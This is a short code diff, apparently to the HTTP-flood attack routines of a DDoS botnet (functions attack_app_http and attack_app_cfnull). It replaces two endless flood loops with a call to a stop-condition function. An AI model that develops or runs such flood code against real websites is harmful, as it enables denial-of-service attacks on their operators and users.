@@ -127,7 +127,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
         util_strcpy(http_table[i].path, path);
     }
 
-    while(TRUE)
+    while (attack_should_continue())
     {
         fd_set fdset_rd, fdset_wr;
         int mfd = 0, nfds;
@@ -913,7 +913,7 @@ void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t o
         }
     }
 
-    while(TRUE)
+    while (attack_should_continue())
     {
         fd_set fdset_rd, fdset_wr;
         int mfd = 0, nfds;
